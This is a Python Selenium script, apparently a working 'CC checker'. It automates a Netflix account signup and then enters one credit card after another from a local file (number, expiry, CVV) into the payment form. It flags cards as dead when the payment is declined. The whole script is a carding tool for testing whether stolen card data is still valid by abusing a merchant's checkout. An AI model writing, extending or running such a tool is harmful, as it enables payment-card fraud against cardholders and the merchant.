#New CC Checker - Netflix Based
#HELP:  https://selenium-python.readthedocs.io/locating-elements.html

import time
from threading import Thread
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from colorama import init
from colorama import Fore, Back, Style

init()

driver = webdriver.Firefox()

#Open Page

driver.get('https://www.netflix.com/tr-en/')

#Register Netflix

email = driver.find_element(By.ID, 'id_email_hero_fuji')
email.send_keys('verifymeimhackerfuckyounetflixTF@hotmail.com')

get_started = driver.find_element(By.CSS_SELECTOR, 'div.our-story-card-text:nth-child(2) > form:nth-child(3) > div:nth-child(2) > div:nth-child(2) > button:nth-child(1)')
get_started.click()

while(driver.current_url != 'https://www.netflix.com/signup/registration?locale=en-TR'):
    time.sleep(1)

print(Fore.GREEN + 'Next Page [1]')
time.sleep(10)

while(driver.current_url != 'https://www.netflix.com/signup/regform'):
    time.sleep(1)

password = driver.find_element(By.ID, 'id_password')
password.send_keys('9IMhackEr*')

print(Fore.GREEN + 'Next Page [2]')
time.sleep(10)

while(driver.current_url != 'https://www.netflix.com/signup'):
    time.sleep(1)

print(Fore.GREEN + 'Next Page [3]')
time.sleep(10)

while(driver.current_url != 'https://www.netflix.com/signup/planform'):
    time.sleep(1)

select_basic_plan = driver.find_element(By.CSS_SELECTOR, 'label.planGrid__selectorChoice:nth-child(2) > span:nth-child(2)')
select_basic_plan.click()
                                                                                                                                                      
print(Fore.GREEN + 'Next Page [4]')
time.sleep(10)

while(driver.current_url != 'https://www.netflix.com/signup/paymentPicker'):
    time.sleep(1)

credit_card = driver.find_element(By.CLASS_NAME, 'mopNameAndLogos')
credit_card.click()

while(driver.current_url != 'https://www.netflix.com/signup/creditoption'):
    time.sleep(1)

i_agree = driver.find_element(By.CLASS_NAME, 'ui-binary-input')
i_agree.click()

first_name = driver.find_element(By.ID, 'id_firstName')
first_name.send_keys('Jhhonotanysins')

last_name = driver.find_element(By.ID, 'id_lastName')
last_name.send_keys('Smmithhlucifer')

file = open('/home/gza/Desktop/CC Checker/cc.txt', 'r')
Lines = file.readlines()

for line in Lines:

    

    card_number = line[0]+line[1]+line[2]+line[3]+line[4]+line[5]+line[6]+line[7]+line[8]+line[9]+line[10]+line[11]+line[12]+line[13]+line[14]+line[15]
    card_month = line[17]+line[18]
    card_year = line[20]+line[21]+line[22]+line[23]
    card_cvv = line[25]+line[26]+line[27]

    cardnumber = driver.find_element(By.ID, 'id_creditCardNumber')
    cardnumber.send_keys(card_number)

    expiration = driver.find_element(By.ID, 'id_creditExpirationMonth')
    expiration.send_keys(card_month+card_year)

    cardcvv = driver.find_element(By.ID, 'id_creditCardSecurityCode')
    cardcvv.send_keys(card_cvv)

    member_ship = driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div[2]/div/form/div[2]')
    member_ship.click()

    time.sleep(5)

    if(driver.current_url == 'https://www.netflix.com/signup/otpPhoneEntry'):
        driver.get('https://www.netflix.com/signup/creditoption')

    try:
        messagebox = driver.find_element(By.CLASS_NAME, 'css-1i6ajsg')
        if(messagebox.text == 'There appears to be a problem with the payment method you are trying to use.'):
            print(Fore.RED + 'Dead --> CARD')
    except:
        print('message null')
    
    cardnumberWR = driver.find_element(By.ID, 'id_creditCardNumber')
    cardnumberWR.clear()

    expirationWR = driver.find_element(By.ID, 'id_creditExpirationMonth')
    expirationWR.clear()